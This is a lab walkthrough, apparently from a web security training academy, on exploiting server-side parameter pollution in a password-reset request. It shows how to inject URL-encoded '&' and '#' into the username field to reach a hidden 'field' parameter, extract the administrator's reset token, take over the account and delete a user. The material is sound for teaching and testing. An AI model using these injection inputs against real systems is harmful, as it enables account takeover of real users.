# 04. Lab: Exploiting server-side parameter pollution in a query string

## ğŸ¯ **Lab Objective**

> âœ… Log in as the administrator and delete carlos.
> 

---

## ğŸ§  **Required Knowledge**

To solve this lab, you'll need to understand:

- ğŸ§© How to use **URL query syntax** to alter server-side requests
- ğŸ§ª How to analyze **error messages** to understand how the API handles input

ğŸ“š These topics are covered in our **API Testing Academy**.

---

## ğŸ§ª **Step-by-Step Solution**

---

### 1ï¸âƒ£ Trigger Password Reset

ğŸ§­ In **Burpâ€™s browser**, trigger a password reset for the `administrator` user.

![2025-07-08_12-05.png](LabImg/2025-07-08_12-05.png)

![2025-07-08_12-05_1.png](LabImg/2025-07-08_12-05_1.png)

![2025-07-08_12-06.png](LabImg/2025-07-08_12-06.png)

![2025-07-08_12-06_1.png](LabImg/2025-07-08_12-06_1.png)

![2025-07-08_12-07.png](LabImg/2025-07-08_12-07.png)

![2025-07-08_12-07_1.png](LabImg/2025-07-08_12-07_1.png)

---

### 2ï¸âƒ£ Analyze HTTP History

ğŸ” Go to `Proxy > HTTP history`

- Locate the request: `POST /forgot-password`
- Also note the related JavaScript file:
    
    ```
    /static/js/forgotPassword.js
    ```
    
    ![2025-07-08_12-08.png](LabImg/2025-07-08_12-08.png)
    

---

### 3ï¸âƒ£ Send to Repeater

ğŸ–±ï¸ Right-click `POST /forgot-password` â†’ **Send to Repeater**

In Repeater:

âœ… Send the original request to verify consistent response.

---

### 4ï¸âƒ£ Test With Invalid Username

Change:

```
username=administrator

```

To:

```
username=administratorx

```

ğŸ“¨ Send the request â†’ ğŸ”´ Returns `Invalid username` error

![2025-07-08_12-10_1.png](LabImg/2025-07-08_12-10_1.png)

---

### 5ï¸âƒ£ Inject a Second Parameter

Try injecting a second parameter using a **URL-encoded `&`**:

```
username=administrator%26x=y

```

ğŸ“¨ Send the request â†’ ğŸ”´ `Parameter is not supported`

âœ”ï¸ Indicates internal API is parsing `&x=y` as a **separate parameter**

![2025-07-08_12-12.png](LabImg/2025-07-08_12-12.png)

---

### 6ï¸âƒ£ Attempt Query Truncation

Use a **URL-encoded `#`** to truncate:

```
username=administrator%23

```

ğŸ“¨ Send â†’ ğŸŸ¡ `Field not specified` error

âœ”ï¸ Suggests that a `field` parameter was **expected but removed**

![2025-07-08_12-11.png](LabImg/2025-07-08_12-11.png)

---

### 7ï¸âƒ£ Inject Invalid Field Parameter

Try:

```
username=administrator%26field=x%23

```

ğŸ“¨ Send â†’ ğŸ”´ `Invalid field` error

âœ”ï¸ The **field** parameter is recognized!

---

### 8ï¸âƒ£ Brute-force the Field Value

ğŸ” Go to **Intruder**:

- Right-click â†’ `Send to Intruder`
- Add payload markers:
    
    ```
    username=administrator%26field=Â§xÂ§%23
    
    ```
    
- Use **Payload type:**
    
    ğŸ”§ `Add from list` â†’ `Server-side variable names`
    

â–¶ï¸ Start the attack

ğŸ“ Review responses:

- `username` and `email` fields return `200 OK` â†’ Likely valid

---

### 9ï¸âƒ£ Set Field to Email

Modify to:

```
username=administrator%26field=email%23

```

ğŸ“¨ Send â†’ âœ… Original response returned

âœ”ï¸ Confirms `email` is a valid field

![2025-07-08_12-21.png](LabImg/2025-07-08_12-21.png)

![2025-07-08_12-22.png](LabImg/2025-07-08_12-22.png)

![2025-07-08_12-22_1.png](LabImg/2025-07-08_12-22_1.png)

![2025-07-08_12-23.png](LabImg/2025-07-08_12-23.png)

![2025-07-08_12-24.png](LabImg/2025-07-08_12-24.png)

---

### ğŸ” Review JavaScript

In `Proxy > HTTP history`, examine:

```
/static/js/forgotPassword.js

```

Look for the **password reset endpoint**:

```
/forgot-password?reset_token=${resetToken}

```

![2025-07-08_12-09.png](LabImg/2025-07-08_12-09.png)

![2025-07-08_12-09_1.png](LabImg/2025-07-08_12-09_1.png)

![2025-07-08_12-10.png](LabImg/2025-07-08_12-10.png)

---

### ğŸ”“ Extract Reset Token

Try:

```
username=administrator%26field=reset_token%23

```

ğŸ“¨ Send the request â†’ âœ… A **reset token** is returned

ğŸ“ **Copy the token**

![2025-07-08_12-25.png](LabImg/2025-07-08_12-25.png)

---

### 1ï¸âƒ£1ï¸âƒ£ Reset Admin Password

ğŸ–¥ï¸ In Burpâ€™s browser, navigate to:

```
/forgot-password?reset_token=<your_token>

```

ğŸ” Set a **new password** for the administrator

![2025-07-08_12-32.png](LabImg/2025-07-08_12-32.png)

---

### 1ï¸âƒ£2ï¸âƒ£ Log In & Solve Lab

âœ… Log in as **administrator** with the new password

ğŸ—‘ï¸ Go to **Admin panel** â†’ **Delete carlos**

ğŸ‰ Lab Solved!

![2025-07-08_12-34.png](LabImg/2025-07-08_12-34.png)

![2025-07-08_12-35.png](LabImg/2025-07-08_12-35.png)

![2025-07-08_12-35_1.png](LabImg/2025-07-08_12-35_1.png)

![2025-07-08_12-35_2.png](LabImg/2025-07-08_12-35_2.png)

---

## ğŸ“º **Community Solutions**

> ğŸ”— [Watch the solution video:](https://youtu.be/cXAlzbNI7fo)
>